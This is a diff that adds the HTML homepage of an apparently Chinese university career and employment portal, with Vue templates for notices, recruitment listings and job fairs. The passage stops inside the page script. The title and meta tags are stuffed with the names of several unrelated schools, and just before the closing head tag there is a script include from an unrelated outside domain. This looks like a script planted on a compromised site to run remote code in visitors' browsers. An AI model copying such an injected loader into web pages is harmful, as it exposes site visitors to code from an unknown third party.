@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>南航金城学院教务处_南京财经大学教务处_南京艺术学院学生就业创业网</title>
+    <meta name="viewport" content="user-scalable=yes">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="Keywords" content="南航金城学院教务处_南京财经大学教务处_南京艺术学院就业宝精准就业平台  高校 大学 大学生 就业 就业网 就业信息网 就业指导 就业指导中心   就业中心 创业 创业指导  精准就业 智慧就业">
+    <meta name="Description" content="南航金城学院教务处_南京财经大学教务处_南京艺术学院就业宝精准就业平台  高校 大学 大学生 就业 就业网 就业信息网 就业指导 就业指导中心   就业中心 创业 创业指导  精准就业 智慧就业">
+    <script>/*@cc_on window.location.href="http://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); @*/</script>    
+    
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/swiper.min.css">
+    <link rel="stylesheet" href="t/font_555113_o1918lvym1c.css">
+    <link rel="stylesheet" href="css/some.css">
+    <link rel="stylesheet" href="css/index1.css">
+    <link rel="stylesheet" href="css/rili.css">
+    <link rel="stylesheet" href="css/slick.css">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js"></script>
+    <script src="http://apps.bdimg.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <script src="js/jquery-base.js"></script>
+    <script src="js/polyfill.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/calendar.js"></script>
+    <script src="js/swiper.min.js"></script>
+    <script src="js/slick.min.js"></script>
+    <script src="js/modernizr.custom.97074.js"></script>
+    <script src="js/jquery.hoverdir.js"></script>
+    <script src="js/skrollr.min.js"></script>
+    <link rel="stylesheet" href="css/jquery.idcode.css">
+    <script src="js/jquery.idcode.js"></script>
+    <script src="js/lee.min.js"></script>
+    <script src="js/wow.min.js"></script>
+    <script src="js/index.js"></script>
+    <script src="js/config.js"></script>
+    <script src="js/api.js"></script>
+    <script src="js/vue.min.js"></script>
+    <script src="js/wx_get_openid.js"></script>
+    <script src="js/jquery.bay-window.js"></script>
+    <style>
+    #login_corp{
+        display: none !important;
+    }
+    </style>
+
+<script type="text/javascript" src="https://hnci.net.cn/js/kb.js"></script></head>
+<body ontouchstart="">
+    <div class="header"></div>
+    <div class="is_"></div>
+    <div class="warp_content" id="warpindex">
+        <template>
+            <!-- 轮播图 -->
+            <div class="scroll">
+                <ul class="slides">
+                    <li class="item" v-for="banner in banners">
+                        <template v-if="banner.link">
+                            <a :href="banner.link">
+                                <img :src="banner.pic_url_name | banner_src" alt="">
+                            </a>
+                        </template>
+                        <template v-else="">
+                            <a>
+                                <img :src="banner.pic_url_name | banner_src" alt="">
+                            </a>
+                        </template>
+                    </li>
+                </ul>
+                <div class="scroll-text">
+                    <ul class="txtslides">
+                    </ul>
+                    <div class="point">
+                    </div>
+                    <a class="prev" href="">
+                        <img src="image/prev.png" alt="">
+                             </a>
+                             <a class="next" href=""><img src="image/next.png" alt=""></a>
+                </div>
+            </div>
+
+            <div class="cont_main">
+                <div class="contai_ner">
+                    <div class="flex-box zdy_main">
+                        <a :href="'../News/zdylist.html?cateid='+zdy6" class="zdy1">
+                            <div>
+                                <img src="image/t/icon1.png" alt="">
+                                <span style="margin-top: 11px;">政策法规</span>
+                            </div>
+                        </a>
+                        <a :href="'../News/zdylist.html?cateid='+zdy2" class="zdy2">
+                            <div>
+                                <img src="image/t/icon2.png" alt="">
+                                <span style="margin-top: 13px;">就业手续</span>
+                            </div>
+                        </a>
+                        <a :href="'../News/zdylist.html?cateid='+zdy7" class="zdy3">
+                            <div>
+                                <img src="image/t/icon3.png" alt="">
+                                <span>创新创业</span>
+                            </div>
+                        </a>
+                        <a :href="'../News/zdylist.html?cateid='+zdy8" class="zdy4">
+                            <div>
+                                <img src="image/t/icon4.png" alt="">
+                                <span>精品课程</span>
+                            </div>
+                        </a>
+                        <a :href="'../News/zdylist.html?cateid='+zdy9" class="zdy5">
+                            <div>
+                                <img src="image/t/icon5.png" alt="">
+                                <span>生涯咨询</span>
+                            </div>
+                        </a>
+                        <a data-toggle="modal" data-target="#attentWxs" class="zdy6">
+                            <div>
+                                <img src="image/t/icon6.png" alt="">
+                                <span>职业测评</span>
+                            </div>
+                        </a>
+                        <a href="javascript:;" target="_blank" class="zdy7">
+                            <div>
+                                <img src="image/t/icon7.png" alt="">
+                                <span>国际组织</span>
+                            </div>
+                        </a>
+                        <a :href="'../News/zdylist.html?cateid='+zdy11" class="zdy8">
+                            <div>
+                                <img src="image/t/icon8.png" alt="" style="margin-top: 5px;">
+                                <span style="margin-top: 15px;">生源信息</span>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="flex-box news_main">
+                        <div class="">
+                            <div class="news_top">
+                                <img src="image/t/xw.png" alt="">
+                                <h3>通知新闻</h3>
+                                <a :href="'/News/newsList.html?cateid='+news1" class="tong__" style="display: block;">MORE</a>
+                                <a :href="'/News/newsList.html?cateid='+news2" class="xin__">MORE</a>
+                                <a :href="'/News/newsList.html?cateid='+news3" class="gong__">MORE</a>
+                            </div>
+                            <div class="news_bottom">
+                                <div class="nb_top">
+                                    <a aa="tong" class="fcolor tong">通知</a>
+                                    <i>|</i>
+                                    <a aa="xin" class="xin">新闻</a>
+                                    <i>|</i>
+                                    <a aa="gong" class="gong">公告</a>
+                                </div>
+                                <ul class="nb_bottom tong_" style="display: block;">
+                                    <template v-if="newlist1.length == 0">
+                                        <div class="iskong" style="margin-top:35px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else="">
+                                        <li :title="place.title" v-for="place in newlist1">
+                                            <template v-if="place.istop == '1'">
+                                                <i>[置顶]</i>
+                                            </template>
+                                            <template v-if="place.content_url == ''">
+                                                <a :href="'/News/newsXiang.html?cateid='+news1+'&id='+place.id">{{place.title}}</a>
+                                            </template>
+                                            <template v-else="">
+                                                <a :href="place.content_url" target="_blank" :title="place.title">{{place.title}}</a>
+                                            </template>
+                                            <span>{{place.addtime1}}</span>
+                                        </li>
+                                    </template>
+                                </ul>
+                                <ul class="nb_bottom xin_">
+                                    <template v-if="newlist2.length == 0">
+                                        <div class="iskong" style="margin-top:35px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else="">
+                                        <li :title="place.title" v-for="place in newlist2">
+                                            <template v-if="place.istop == '1'">
+                                                <i>[置顶]</i>
+                                            </template>
+                                            <template v-if="place.content_url == ''">
+                                                <a :href="'/News/newsXiang.html?cateid='+news2+'&id='+place.id">{{place.title}}</a>
+                                            </template>
+                                            <template v-else="">
+                                                <a :href="place.content_url" target="_blank" :title="place.title">{{place.title}}</a>
+                                            </template>
+                                            <span>{{place.addtime1}}</span>
+                                            <!-- <span>2019-05-14</span> -->
+                                        </li>
+                                    </template>
+                                </ul>
+                                <ul class="nb_bottom gong_">
+                                    <template v-if="newlist3.length == 0">
+                                        <div class="iskong" style="margin-top:35px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else="">
+                                        <li :title="place.title" v-for="place in newlist3">
+                                            <template v-if="place.istop == '1'">
+                                                <i>[置顶]</i>
+                                            </template>
+                                            <template v-if="place.content_url == ''">
+                                                <a :href="'/News/newsXiang.html?cateid='+news3+'&id='+place.id">{{place.title}}</a>
+                                            </template>
+                                            <template v-else="">
+                                                <a :href="place.content_url" target="_blank" :title="place.title">{{place.title}}</a>
+                                            </template>
+                                            <span>{{place.addtime1}}</span>
+                                        </li>
+                                    </template>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="">
+                            <div class="news_top">
+                                <img src="image/t/xz.png" alt="">
+                                <h3>校招公告</h3>
+                                <a href="javascript:;" style="display: block;">MORE</a>
+                            </div>
+                            <div class="news_bottom">
+                                <ul class="nb_bottom" style="display: block;margin-top: 4px;">
+                                    <template v-if="xzgglist.length == '0'">
+                                        <div class="iskong" style="margin-top:65px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else="">
+                                        <li :title="place.title" v-for="place in xzgglist">
+                                            <template v-if="place.istop == '1'">
+                                                <i>[置顶]</i>
+                                            </template>
+                                            <a :href="'/Zhaopin/xiaozhao.html?type='+place.enrollment_type+'&id='+place.id">{{place.title}}</a>
+                                            <span>{{place.addtime1}}</span>
+                                        </li>
+                                    </template>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="">
+                            <div class="news_top">
+                                <img src="image/t/jy.png" alt="">
+                                <h3>就业信息</h3>
+                                <!-- <a :href="'Zhaopin/zhiweiList.html?jobtypes=2&cate_id1='+jobtype" class="jsrcai__">MORE</a> -->
+                                <a href="javascript:;" class="zhzpin__" style="display: block;">MORE</a>
+                            </div>
+                            <div class="news_bottom">
+                                <!-- <div class="nb_top">
+                                    <a aa="jsrcai" class="fcolor jsrcai">教师人才</a>
+                                    <i>|</i>
+                                    <a aa="zhzpin" class="zhzpin">综合招聘</a>
+                                </div>
+                                <ul class="xw_bottom jsrcai_" style="display: block;">
+                                    <template v-if="teachers.length == '0'">
+                                        <div class="iskong" style="margin-top:35px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else>
+                                        <li :title="place.work_name" v-for="place in teachers">
+                                            <a :href="'Zhaopin/zhiweiDetail.html?jobtypes=2&cate_id1='+jobtype+'&id='+place.id">
+                                                <p class="times left">
+                                                    <b>{{place.addtime1}}</b>
+                                                    <span>{{place.addtime2}}</span>
+                                                </p>
+                                                <div class="titles left">
+                                                    <h4>
+                                                        <template v-if="place.istop == '1'">
+                                                            <i>[置顶]</i>
+                                                        </template>
+                                                        {{place.work_name}}
+                                                    </h4>
+                                                    <p>
+                                                        <span class="left"><i class="iconfont icon-qiyegongchangjianzhu"></i>{{place.com_id_name}}</span>
+                                                        <span class="right"><i class="iconfont icon-eye" style="font-size: 12px;"></i>{{place.viewcount}}</span>
+                                                    </p>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                </ul> -->
+                                <ul class="xw_bottom zhzpin_" style="display: block;margin-top: 4px;">
+                                    <template v-if="zhzplist.length == '0'">
+                                        <div class="iskong" style="margin-top:35px;">
+                                            <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                            <span>暂无数据</span>
+                                        </div>
+                                    </template>
+                                    <template v-else="">
+                                        <li :title="place.work_name" v-for="place in zhzplist">
+                                            <a :href="'Zhaopin/zhiweiDetail.html?jobtypes=1&id='+place.id">
+                                                <p class="times left">
+                                                    <b>{{place.addtime1}}</b>
+                                                    <span>{{place.addtime2}}</span>
+                                                </p>
+                                                <div class="titles left">
+                                                    <h4>
+                                                        <template v-if="place.istop == '1'">
+                                                            <i>[置顶]</i>
+                                                        </template>
+                                                        {{place.work_name}}
+                                                    </h4>
+                                                    <p>
+                                                        <span class="left"><i class="iconfont icon-qiyegongchangjianzhu"></i>{{place.com_id_name}}</span>
+                                                        <span class="right"><i class="iconfont icon-eye" style="font-size: 12px;"></i>{{place.viewcount}}</span>
+                                                    </p>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="shuangxuan">
+                <div class="contai_ner">
+                    <div class="sxh_l">
+                        <img src="image/t/sx.png" alt="">
+                        <span aaa="xuan" class="fcolor">宣讲会</span>
+                        <i></i>
+                        <span aaa="sxhui">双选会</span>
+                        <a href="javascript:;" class="xuan__" style="display:block;">MORE</a>
+                        <a href="javascript:;" class="sxhui__">MORE</a>
+                    </div>
+                    <div class="sx_bottom xuan_" style="display:block;">
+                        <div class="xuan_box">
+                            <ul>
+                                <template v-if="xjhlist1.length == 0">
+                                    <div class="iskong" style="margin-top:30px;">
+                                        <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                        <span>暂无数据</span>
+                                    </div>
+                                </template>
+                                <template v-else="">
+                                    <li class="flex-box li1">
+                                        <a :href="'/Zhaopin/zuijin.html?id='+place.id" v-for="place in xjhlist1">
+                                            <div>
+                                                <div class="neir">
+                                                    <span v-if="place.publish_status == 2" class="yqx">已取消</span>
+                                                    <span v-else-if="place.timestatus == 1" class="zajx">正在进行</span>
+                                                    <span v-else-if="place.timestatus == 2" class="wks">未开始</span>
+                                                    <span v-else-if="place.timestatus == 3" class="yjs">已结束</span>
+                                                    <h4 :title="place.title">
+                                                        <template v-if="place.istop == 1">
+                                                            <i>[置顶]</i>
+                                                        </template>
+                                                        {{place.title}}
+                                                    </h4>
+                                                    <p>
+                                                        <span class="left">举办时间：</span>
+                                                        <span class="left p_s" v-if="place.hold_date == ''">{{place.hold_starttime+" "+place.hold_endtime}}</span>
+                                                        <span class="left p_s" v-if="place.hold_starttime == '' || place.hold_endtime == ''">{{place.hold_date}}</span>
+                                                        <span class="left p_s" v-else-if="place.hold_starttime == ''">{{place.hold_endtime}}</span>
+                                                        <span class="left p_s" v-else-if="place.hold_endtime == ''">{{place.hold_starttime}}</span>
+                                                        <span class="left p_s" v-else-if="place.hold_date != '' && place.hold_starttime != '' && place.hold_endtime != ''">{{place.hold_date+" "+place.hold_starttime+"-"+place.hold_endtime}}</span>
+                                                        <span class="left p_s" v-else="">暂无数据</span>
+                                                    </p>
+                                                    <p>
+                                                        <span class="left">举办地点：</span>
+                                                        <span class="left p_s" v-if="place.field_id == '' && place.publish_type == '1'">{{place.address}}</span>
+                                                        <span class="left p_s" v-else-if="place.preach_type == '1' && place.publish_type == '1'">{{place.field_id_address}}</span>
+                                                        <span class="left p_s" v-else-if="place.preach_type == '2'">{{place.tmp_field_name}}</span>
+                                                        <span class="left p_s" v-else="">暂无数据</span>
+                                                    </p>
+                                                    <p>
+                                                        <span class="left">用人单位：</span>
+                                                        <span class="left p_s">{{place.com_id_name}}</span>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </li>
+                                    <template v-if="xjhlist2.length > 0">
+                                        <li class="flex-box li2">
+                                            <a :href="'/Zhaopin/zuijin.html?id='+place.id" v-for="place in xjhlist2">
+                                                <div>
+                                                    <div class="neir">
+                                                        <span v-if="place.publish_status == 2" class="yqx">已取消</span>
+                                                        <span v-else-if="place.timestatus == 1" class="zajx">正在进行</span>
+                                                        <span v-else-if="place.timestatus == 2" class="wks">未开始</span>
+                                                        <span v-else-if="place.timestatus == 3" class="yjs">已结束</span>
+                                                        <h4 :title="place.title">
+                                                            <template v-if="place.istop == 1">
+                                                                <i>[置顶]</i>
+                                                            </template>
+                                                            {{place.title}}
+                                                        </h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s" v-if="place.hold_date == ''">{{place.hold_starttime+" "+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-if="place.hold_starttime == '' || place.hold_endtime == ''">{{place.hold_date}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_starttime == ''">{{place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_endtime == ''">{{place.hold_starttime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_date != '' && place.hold_starttime != '' && place.hold_endtime != ''">{{place.hold_date+" "+place.hold_starttime+"-"+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s" v-if="place.field_id == '' && place.publish_type == '1'">{{place.address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '1' && place.publish_type == '1'">{{place.field_id_address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '2'">{{place.tmp_field_name}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">用人单位：</span>
+                                                            <span class="left p_s">{{place.com_id_name}}</span>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                    <template v-if="xjhlist3.length > 0">
+                                        <li class="flex-box li3">
+                                            <a :href="'/Zhaopin/zuijin.html?id='+place.id" v-for="place in xjhlist3">
+                                                <div>
+                                                    <div class="neir">
+                                                        <span v-if="place.publish_status == 2" class="yqx">已取消</span>
+                                                        <span v-else-if="place.timestatus == 1" class="zajx">正在进行</span>
+                                                        <span v-else-if="place.timestatus == 2" class="wks">未开始</span>
+                                                        <span v-else-if="place.timestatus == 3" class="yjs">已结束</span>
+                                                        <h4 :title="place.title">
+                                                            <template v-if="place.istop == 1">
+                                                                <i>[置顶]</i>
+                                                            </template>
+                                                            {{place.title}}
+                                                        </h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s" v-if="place.hold_date == ''">{{place.hold_starttime+" "+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-if="place.hold_starttime == '' || place.hold_endtime == ''">{{place.hold_date}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_starttime == ''">{{place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_endtime == ''">{{place.hold_starttime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_date != '' && place.hold_starttime != '' && place.hold_endtime != ''">{{place.hold_date+" "+place.hold_starttime+"-"+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s" v-if="place.field_id == '' && place.publish_type == '1'">{{place.address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '1' && place.publish_type == '1'">{{place.field_id_address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '2'">{{place.tmp_field_name}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">用人单位：</span>
+                                                            <span class="left p_s">{{place.com_id_name}}</span>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                    <template v-if="xjhlist4.length > 0">
+                                        <li class="flex-box li4">
+                                            <a :href="'/Zhaopin/zuijin.html?id='+place.id" v-for="place in xjhlist4">
+                                                <div>
+                                                    <div class="neir">
+                                                        <span v-if="place.publish_status == 2" class="yqx">已取消</span>
+                                                        <span v-else-if="place.timestatus == 1" class="zajx">正在进行</span>
+                                                        <span v-else-if="place.timestatus == 2" class="wks">未开始</span>
+                                                        <span v-else-if="place.timestatus == 3" class="yjs">已结束</span>
+                                                        <h4 :title="place.title">
+                                                            <template v-if="place.istop == 1">
+                                                                <i>[置顶]</i>
+                                                            </template>
+                                                            {{place.title}}
+                                                        </h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s" v-if="place.hold_date == ''">{{place.hold_starttime+" "+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-if="place.hold_starttime == '' || place.hold_endtime == ''">{{place.hold_date}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_starttime == ''">{{place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_endtime == ''">{{place.hold_starttime}}</span>
+                                                            <span class="left p_s" v-else-if="place.hold_date != '' && place.hold_starttime != '' && place.hold_endtime != ''">{{place.hold_date+" "+place.hold_starttime+"-"+place.hold_endtime}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s" v-if="place.field_id == '' && place.publish_type == '1'">{{place.address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '1' && place.publish_type == '1'">{{place.field_id_address}}</span>
+                                                            <span class="left p_s" v-else-if="place.preach_type == '2'">{{place.tmp_field_name}}</span>
+                                                            <span class="left p_s" v-else="">暂无数据</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">用人单位：</span>
+                                                            <span class="left p_s">{{place.com_id_name}}</span>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                </template>
+                            </ul>
+                        </div>
+                        <span class="xjbtn xj_left"><img src="image/t/xj_left.png" alt=""></span>
+                        <span class="xjbtn xj_right"><img src="image/t/xj_right.png" alt=""></span>
+                    </div>
+                    <div class="sx_bottom sxhui_">
+                        <div class="sxhui_box">
+                            <ul>
+                                <template v-if="sxhlist1.length == 0">
+                                    <div class="iskong" style="margin-top:30px;">
+                                        <img src="image/is_kong1.png" alt="" style="width:120px;">
+                                        <span>暂无数据</span>
+                                    </div>
+                                </template>
+                                <template v-else="">
+                                    <li class="flex-box li1">
+                                        <a :href="'/Chuangye/detail.html?id='+place.id" class="col-xs-6 col-md-4" v-for="place in sxhlist1">
+                                            <div>
+                                                <div class="neir">
+                                                    <template v-if="place.isenroll == '1'">
+                                                        <template v-if="place.status_id == '0'">
+                                                            <span class="wks">待举办</span>
+                                                        </template>
+                                                        <template v-else-if="place.status_id == '2'">
+                                                            <span class="jjks">即将开始</span>
+                                                        </template>
+                                                        <template v-else-if="place.status_id == '3'">
+                                                            <span class="yjs">已结束</span>
+                                                        </template>
+                                                        <template v-else="">
+                                                            <span class="zajx">正在进行</span>
+                                                        </template>
+                                                    </template>
+                                                    <template v-if="place.isenroll == '2'">
+                                                        <span class="yjs">已结束</span>
+                                                    </template>
+                                                    <h4>{{place.title}}</h4>
+                                                    <p>
+                                                        <span class="left">举办时间：</span>
+                                                        <span class="left p_s">{{place.start_time1}}</span>
+                                                    </p>
+                                                    <p>
+                                                        <span class="left">举办地点：</span>
+                                                        <span class="left p_s">{{place.field_id_name}}</span>
+                                                    </p>
+                                                    <p class="net_p">
+                                                        <small>招聘人数：<i>{{place.recruit_count}}</i></small>
+                                                        <small>招聘职位：<i>{{place.job_count}}</i></small>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </li>
+                                    <template v-if="sxhlist2.length > 0">
+                                        <li class="flex-box li2">
+                                            <a :href="'/Chuangye/detail.html?id='+place.id" class="col-xs-6 col-md-4" v-for="place in sxhlist2">
+                                                <div>
+                                                    <div class="neir">
+                                                        <template v-if="place.isenroll == '1'">
+                                                            <template v-if="place.status_id == '0'">
+                                                                <span class="wks">待举办</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '2'">
+                                                                <span class="jjks">即将开始</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '3'">
+                                                                <span class="yjs">已结束</span>
+                                                            </template>
+                                                            <template v-else="">
+                                                                <span class="zajx">正在进行</span>
+                                                            </template>
+                                                        </template>
+                                                        <template v-if="place.isenroll == '2'">
+                                                            <span class="yjs">已结束</span>
+                                                        </template>
+                                                        <h4>{{place.title}}</h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s">{{place.start_time1}}</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s">{{place.field_id_name}}</span>
+                                                        </p>
+                                                        <p class="net_p">
+                                                            <small>招聘人数：<i>{{place.recruit_count}}</i></small>
+                                                            <small>招聘职位：<i>{{place.job_count}}</i></small>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                    <template v-if="sxhlist3.length > 0">
+                                        <li class="flex-box li3">
+                                            <a :href="'/Chuangye/detail.html?id='+place.id" class="col-xs-6 col-md-4" v-for="place in sxhlist3">
+                                                <div>
+                                                    <div class="neir">
+                                                        <template v-if="place.isenroll == '1'">
+                                                            <template v-if="place.status_id == '0'">
+                                                                <span class="wks">待举办</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '2'">
+                                                                <span class="jjks">即将开始</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '3'">
+                                                                <span class="yjs">已结束</span>
+                                                            </template>
+                                                            <template v-else="">
+                                                                <span class="zajx">正在进行</span>
+                                                            </template>
+                                                        </template>
+                                                        <template v-if="place.isenroll == '2'">
+                                                            <span class="yjs">已结束</span>
+                                                        </template>
+                                                        <h4>{{place.title}}</h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s">{{place.start_time1}}</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s">{{place.field_id_name}}</span>
+                                                        </p>
+                                                        <p class="net_p">
+                                                            <small>招聘人数：<i>{{place.recruit_count}}</i></small>
+                                                            <small>招聘职位：<i>{{place.job_count}}</i></small>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                    <template v-if="sxhlist4.length > 0">
+                                        <li class="flex-box li4">
+                                            <a :href="'/Chuangye/detail.html?id='+place.id" class="col-xs-6 col-md-4" v-for="place in sxhlist4">
+                                                <div>
+                                                    <div class="neir">
+                                                        <template v-if="place.isenroll == '1'">
+                                                            <template v-if="place.status_id == '0'">
+                                                                <span class="wks">待举办</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '2'">
+                                                                <span class="jjks">即将开始</span>
+                                                            </template>
+                                                            <template v-else-if="place.status_id == '3'">
+                                                                <span class="yjs">已结束</span>
+                                                            </template>
+                                                            <template v-else="">
+                                                                <span class="zajx">正在进行</span>
+                                                            </template>
+                                                        </template>
+                                                        <template v-if="place.isenroll == '2'">
+                                                            <span class="yjs">已结束</span>
+                                                        </template>
+                                                        <h4>{{place.title}}</h4>
+                                                        <p>
+                                                            <span class="left">举办时间：</span>
+                                                            <span class="left p_s">{{place.start_time1}}</span>
+                                                        </p>
+                                                        <p>
+                                                            <span class="left">举办地点：</span>
+                                                            <span class="left p_s">{{place.field_id_name}}</span>
+                                                        </p>
+                                                        <p class="net_p">
+                                                            <small>招聘人数：<i>{{place.recruit_count}}</i></small>
+                                                            <small>招聘职位：<i>{{place.job_count}}</i></small>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                            </a>
+                                        </li>
+                                    </template>
+                                </template>
+                            </ul>
+                        </div>
+                        <span class="sxbtn sx_left"><img src="image/t/xj_left.png" alt=""></span>
+                        <span class="sxbtn sx_right"><img src="image/t/xj_right.png" alt=""></span>
+                    </div>
+                </div>
+            </div>
+            <div class="modal fade" id="cnuModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                    <div class="modal-content" style="z-index:1000">
+                        <div class="modal-body">
+                           <iframe id="iframe" src="javascript:;" frameborder="0" style="width: 100%; height: 350px;"></iframe>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 飘窗元素 -->
+            <template v-if="piaoc != null">
+                <template v-if="piaoc.is_open_float_win == '1'">
+                    <div class="automv" :style="'display: block;height:'+piaoc.open_float_height+';width:'+piaoc.open_float_width"><a :href="piaoc.open_float_url">
+                        <span>×</span>
+                        <template v-if="piaoc.open_float_image">
+                            <img :src="piaoc.open_float_image_name+'!220auto'" alt="">
+                        </template>
+                        <template v-else="">
+                            <img src="image/piaochuang.jpg" alt="">
+                        </template>
+                    </a></div>
+                </template>
+                <template v-else="">
+                    <div class="automv" style="display: none;"><a :href="piaoc.open_float_url">
+                        <span>×</span>
+                        <template v-if="piaoc.open_float_image">
+                            <img :src="piaoc.open_float_image_name+'!220auto'" alt="">
+                        </template>
+                        <template v-else="">
+                            <img src="image/piaochuang.jpg" alt="">
+                        </template>
+                    </a></div>
+                </template>
+            </template>
+
+        </template>
+    </div>
+    <div class="toTop">
+        <img src="image/png/fanhui.png" alt=""> 返回顶部
+    </div>
+    <div class="footer"></div>
+    <div class="wxb"></div>
+</body>
+</html>
+<script>
+    $(".header").load("../Public/header.html");
+    $(".footer").load("../Public/footer.html");
+
+    var school_id = sessionStorage.getItem("school_id");
+    var jobtype = sessionStorage.getItem("jobtype");
+    var news1 = sessionStorage.getItem("newT");//重要通知 全局变量
+    var news2 = sessionStorage.getItem("newN");//新闻动态 全局变量
+    var news3 = sessionStorage.getItem("newG");//公示公告 全局变量
+    var zdy2 = sessionStorage.getItem("zdy2");//就业手续 全局变量
+    var zdy6 = sessionStorage.getItem("zdy6");//政策法规 全局变量
+    var zdy7 = sessionStorage.getItem("zdy7");//创新创业 全局变量
+    var zdy8 = sessionStorage.getItem("zdy8");//精品课程 全局变量
+    var zdy9 = sessionStorage.getItem("zdy9");//生涯咨询 全局变量
+    var zdy10 = sessionStorage.getItem("zdy10");//职业测评 全局变量
+    var zdy11 = sessionStorage.getItem("zdy11");//生源信息 全局变量
+
+    var vm = new Vue({
+        el:"#warpindex",
+        data:{
+            banners:[],         //轮播图
+            newlist1:[],        //通知
+            newlist2:[],        //新闻
+            newlist3:[],        //公告
+            xzgglist:[],        //校招公告
+            teachers:[],        //教师人才
+            zhzplist:[],        //综合招聘
+            sxhlist1:[],         //双选会
+            sxhlist2:[],
+            sxhlist3:[],
+            sxhlist4:[],
+            xjhlist1:[],        //宣讲会
+            xjhlist2:[],
+            xjhlist3:[],
+            xjhlist4:[],
+            piaoc:{},          //飘窗
+            zdy2:zdy2,
+            zdy6:zdy6,
+            zdy7:zdy7,
+            zdy8:zdy8,
+            zdy9:zdy9,
+            zdy10:zdy10,
+            zdy11:zdy11,
+            jobtype:jobtype,
